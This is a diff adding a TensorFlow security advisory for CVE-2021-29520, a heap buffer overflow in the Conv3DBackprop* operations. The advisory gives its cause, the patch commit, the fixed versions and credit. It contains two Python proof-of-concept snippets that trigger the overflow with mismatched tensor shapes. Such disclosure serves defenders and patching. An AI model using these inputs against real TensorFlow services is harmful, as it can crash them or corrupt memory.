@@ -1,0 +1,41 @@
+<h2>TFSA-2021-010: Heap buffer overflow in <code>Conv3DBackprop*</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-29520</p>
+<h3>Impact</h3>
+<p>Missing validation between arguments to <code>tf.raw_ops.Conv3DBackprop*</code> operations
+can result in heap buffer overflows:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>input_sizes = tf.constant([1, 1, 1, 1, 2], shape=[5], dtype=tf.int32)
+filter_tensor = tf.constant([734.6274508233133, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0,
+                            -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0,
+                            -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0], shape=[4, 1, 6, 1, 1], dtype=tf.float32)
+out_backprop = tf.constant([-10.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)</p>
+<p>tf.raw_ops.Conv3DBackpropInputV2(input_sizes=input_sizes, filter=filter_tensor, out_backprop=out_backprop, strides=[1, 89, 29, 89, 1], padding='SAME', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])
+<code></code>python
+import tensorflow as tf</p>
+<p>input_values = [-10.0] * (7 * 7 * 7 * 7 * 7)
+input_values[0] = 429.6491056791816
+input_sizes = tf.constant(input_values, shape=[7, 7, 7, 7, 7], dtype=tf.float32)
+filter_tensor = tf.constant([7, 7, 7, 1, 1], shape=[5], dtype=tf.int32)
+out_backprop = tf.constant([-10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0], shape=[7, 1, 1, 1, 1], dtype=tf.float32)</p>
+<p>tf.raw_ops.Conv3DBackpropFilterV2(input=input_sizes, filter_sizes=filter_tensor, out_backprop=out_backprop, strides=[1, 37, 65, 93, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])
+```</p>
+<p>This is because the
+<a href="https://github.com/tensorflow/tensorflow/blob/4814fafb0ca6b5ab58a09411523b2193fed23fed/tensorflow/core/kernels/conv_grad_shape_utils.cc#L94-L153">implementation</a>
+assumes that the <code>input</code>, <code>filter_sizes</code> and <code>out_backprop</code> tensors have the
+same shape, as they are accessed in parallel.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/8f37b52e1320d8d72a9529b2468277791a261197">8f37b52e1320d8d72a9529b2468277791a261197</a>.</p>
+<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
+commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
+2.1.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu
+X-Team.</p>
